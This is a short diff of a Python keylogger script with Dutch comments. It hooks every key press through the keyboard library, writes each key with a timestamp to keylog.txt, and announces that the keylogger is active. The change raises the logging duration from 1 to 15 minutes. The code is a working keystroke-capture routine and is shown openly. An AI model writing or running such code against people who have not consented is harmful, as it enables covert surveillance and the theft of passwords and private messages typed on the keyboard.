@@ -6,7 +6,7 @@ def log_keystroke(event):
     print(f"[{datetime.now().strftime('%H:%M:%S')}] {key}", file=open("keylog.txt", "a"))
 
 # Stel de logging duur in minuten (standaard 15 minuten)
-logging_duration = 1  # Minuten
+logging_duration = 15  # Minuten
 
 print(f"Keylogger actief voor {logging_duration} minuten...")
 keyboard.on_press(log_keystroke)
